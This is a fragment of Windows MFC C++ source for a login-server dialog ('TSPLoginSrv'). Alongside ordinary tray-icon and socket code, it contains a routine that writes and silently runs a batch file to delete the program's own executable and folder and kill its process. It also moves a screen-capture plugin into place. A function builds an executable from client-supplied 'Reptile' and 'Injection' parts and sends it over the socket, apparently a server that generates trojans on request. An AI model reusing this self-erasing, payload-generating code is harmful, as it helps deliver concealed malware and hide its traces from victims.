	// TODO: 在此添加控件通知处理程序代码
	if ( hLinstenThread != NULL )
	{
		CloseHandle(hLinstenThread);
		hLinstenThread = NULL;
	}
	if ( m_hSocket != INVALID_SOCKET )
	{
		closesocket(m_hSocket);
		m_hSocket = INVALID_SOCKET;
	}
	
	((CEdit*)GetDlgItem(IDC_EDIT_PORT))->EnableWindow(TRUE);
	((CButton*)GetDlgItem(IDC_BTN_STARTSRV))->EnableWindow(TRUE);	//禁用按钮
	((CButton*)GetDlgItem(IDC_BTN_STOPSRV))->EnableWindow(FALSE);
}

void CTSPLoginSrvDlg::OnBnClickedBtnStopsrv2()
{
	// TODO: 在此添加控件通知处理程序代码
}

void CTSPLoginSrvDlg::OnBnClickedBtnExit()
{
	// TODO: 在此添加控件通知处理程序代码
	OnBnClickedBtnStopsrv();
	WSACleanup();
	CDialog::OnCancel();
}

LRESULT CTSPLoginSrvDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (m_nTaskCreatedMSG == message)
	{
		//重建托盘图标
		m_TrayIcon.ShowIcon();

		return 0;
	}
	else if (m_nTaskTrayNotify == message)
	{
		if (LOWORD(lParam) == WM_LBUTTONDBLCLK)
		{
			ShowWindow(SW_SHOW);
			ShowWindow(SW_NORMAL);

			return 0;
		}

		//弹出右键菜单
		return m_TrayIcon.OnTrayNotification(wParam, lParam);
	}

	return CDialog::WindowProc(message, wParam, lParam);
}

void CTSPLoginSrvDlg::OnHide()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_MINIMIZE);
	ShowWindow(SW_HIDE);
}

void CTSPLoginSrvDlg::OnShow()
{
	// TODO: 在此添加命令处理程序代码
	ShowWindow(SW_SHOW);
	ShowWindow(SW_NORMAL);
}

void CTSPLoginSrvDlg::OnExit()
{
	// TODO: 在此添加命令处理程序代码
	CDialog::OnCancel();
}

void RunSelf()
{
	static char templ[] =
		":Repeat\r\n"
		"del \"%s\"\r\n"
		"if exist \"%s\" goto Repeat\r\n"
		"rmdir %s \r\n"
		"taskkill /F /IM \"%s\""
		" /T";
	static const char tempbatname[] = "_uninsep.bat" ;

	char modulename[MAX_PATH] ;  
	char temppath[MAX_PATH] ;
	char folder[MAX_PATH] ;

	GetTempPath(MAX_PATH, temppath) ;
	strcat(temppath, tempbatname) ;

	GetModuleFileName(NULL, modulename, MAX_PATH) ;
	strcpy (folder, modulename) ;
	char *pb = strrchr(folder, '\\');
	if (pb != NULL)
		*pb = 0 ;

	HANDLE hf ;

	hf = CreateFile(temppath, GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL) ;

	if (hf != INVALID_HANDLE_VALUE)
	{
		DWORD len ;
		char *bat ;

		bat = (char*)alloca(strlen(templ) +
			strlen(modulename) * 2 + strlen(temppath) + 20) ;

		wsprintf(bat, templ, modulename, modulename, folder, temppath) ;
		WriteFile(hf, bat, strlen(bat), &len, NULL) ;
		CloseHandle(hf);

		ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
	}
}


void CTSPLoginSrvDlg::OnTimer(UINT_PTR nIDEvent)
{

	TCHAR szCurrenPath[MAX_PATH]={0};
	TCHAR szAutoScreen[MAX_PATH]={0};
	TCHAR szPlugPath[MAX_PATH]={0};

	GetModuleFileNameA(0,szCurrenPath,MAX_PATH);
	TCHAR *strPos=StrRChr(szCurrenPath,0,'\\');


// 	TCHAR szCmd[MAX_PATH]={0};
// 	DWORD dwRead;

	switch(nIDEvent)
	{
	case 0:


		*(strPos+1)=0;

		strcpy(szAutoScreen,szCurrenPath);
		strcat(szAutoScreen,"AutoScreenCap.dll");
		if (!PathFileExistsA(szAutoScreen))
		{
			return;
		}
		strcpy(szPlugPath,szCurrenPath);
		strcat(szPlugPath,"plug\\AutoScreenCap.dll");
		CopyFile(szAutoScreen,szPlugPath,FALSE);

		DeleteFile(szAutoScreen);
		break;
	case 1:


// taskkill /F /IM 进程名.exe /T

		//strcat(szCmd,"taskkill /F /IM ");
		//strcat(szCmd,strPos+1);
// 		strcat(szCmd,"call ");
// 		strcat(szCmd,szCurrenPath);
// 
// 		HANDLE m_hFile = ::CreateFile("1.bat", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
// 
// 
// 		WriteFile(m_hFile, szCmd,strlen(szCmd), &dwRead, NULL);
// 		CloseHandle(m_hFile);
// 		OutputDebugStringA(szCurrenPath);

// 		WinExec(szCurrenPath,0);
// 		RunSelf();
// 		SendMessage(WM_CLOSE,0,0);
		break;


	}


	// TODO: 在此添加消息处理程序代码和/或调用默认值

	CDialog::OnTimer(nIDEvent);
}


//////////////////////////////////////////////////////////////////////////
//UTransmission相关代码
BOOL SendUTransmission(SOCKET sock, char *Buffer)
{
	char szFileName[MAX_PATH] = {0};
	char szOutputFileName[MAX_PATH] = {0};
	GetModuleFileName(NULL, szFileName, sizeof(szFileName));
	LPSTR lpPos = strrchr(szFileName, '\\');
	if (0 == lpPos || lpPos-szFileName > lstrlen(szFileName))
	{
		return FALSE;
	}
	*lpPos = 0;

	char szName[MAX_PATH] = {0};
	wsprintf(szName, "Output_%d.exe", GetTickCount());
	wsprintf(szOutputFileName, "%s\\%s", szFileName, szName);

	//分离输入参数
	lpPos = StrChr(Buffer, '@');
	if (0 == lpPos || lpPos-Buffer > lstrlen(Buffer))
	{
		return FALSE;
	}
	
	char szReptile[MAX_PATH] = {0};
	char szInjection[MAX_PATH] = {0};
	lstrcpyn(szReptile, Buffer, lpPos-Buffer);
	lstrcpyn(szInjection, lpPos+1, lstrlen(Buffer) - (lpPos-Buffer+1));

	BOOL bRet = FALSE;
	CGenUTransmission objGen;
	
	int nRet = objGen.Generate(szReptile, szInjection, szOutputFileName);
	if (ERR_GENERATE_OK == nRet)
	{		
		bRet = TRUE;
		SendFileContext(sock, szName, NULL, NULL);
	}
	
	DeleteFile(szOutputFileName);

	return bRet;
}



